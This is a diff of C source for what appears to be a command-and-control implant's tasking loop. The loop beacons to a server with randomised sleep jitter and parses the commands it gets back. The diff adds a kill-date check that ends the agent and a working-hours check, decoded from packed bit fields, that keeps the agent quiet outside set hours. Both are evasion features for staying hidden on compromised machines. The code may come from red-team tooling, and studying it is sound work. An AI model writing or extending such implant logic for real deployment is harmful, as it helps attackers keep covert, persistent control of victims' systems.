@@ -1,6 +1,5 @@
 #include "TaskController.h"
-#include "parser.h"
-#include "package.h"
+
 
 void TaskingRoutine() {
 
@@ -22,9 +21,15 @@ void TaskingRoutine() {
         //TODO implement encrypted sleep obfuscation.
         Sleep((agent->config->SleepTime * 1000) + ((GenerateRandomNumber() % agent->config->SleepJitter) * 1000));
 
-        //TODO BUILD KILLDATE CHECK
+        if (ReachedKillDate()) {
+            printf("[info] Kill date reached, exiting agent.\n");
+            exit(-1);
+        }
 
-        //TODO BUILD WORKING HOURS CHECK.
+        if (!InWorkingHours())
+        {
+            continue;
+        }
 
         //TODO perform package sending request. that will send all open packages and receive any responses from the server for commands to execute.
         if (!PackageSendAll(&Buffer, &DataBufferSize))
@@ -32,7 +37,6 @@ void TaskingRoutine() {
             break;
         }
 
-		//TODO parse the buffer and extract the command ID and request ID.
 		NewParser(&Parser, Buffer.Buffer, Buffer.BufferLength);
 		AgentCMD.CommandID = ParserReadInt32(&Parser);
 		AgentCMD.RequestID = ParserReadInt32(&Parser);
@@ -52,4 +56,43 @@ void TaskingRoutine() {
     }
 
 	
+}
+
+
+BOOL ReachedKillDate() {
+	UINT64 CurrentTime = 0;
+    CurrentTime = GetUnixTime();
+    if (CurrentTime >= agent->config->KillDate) {
+        return TRUE;
+    }
+	return FALSE;
+}
+
+BOOL InWorkingHours() {
+	SYSTEMTIME SystemTime = { 0 };
+	UINT32 WorkingHours = agent->config->WorkingHours;
+    WORD StartHour = 0;
+    WORD StartMinute = 0;
+    WORD EndHour = 0;
+    WORD EndMinute = 0;
+
+	//if working hours not set return true as we're always in working hours.
+    if (((WorkingHours >> 22) & 1) == 0)
+        return TRUE;
+
+    StartHour = (WorkingHours >> 17) & 0b011111;
+    StartMinute = (WorkingHours >> 11) & 0b111111;
+    EndHour = (WorkingHours >> 6) & 0b011111;
+    EndMinute = (WorkingHours >> 0) & 0b111111;
+
+	agent->apis->pGetLocalTime(&SystemTime);
+
+	if (SystemTime.wHour < StartHour || SystemTime.wHour > EndHour)
+		return FALSE;
+	if (SystemTime.wHour == StartHour && SystemTime.wMinute < StartMinute)
+		return FALSE;
+	if (SystemTime.wHour == EndHour && SystemTime.wMinute > EndMinute)
+		return FALSE;
+
+	return TRUE;
 }
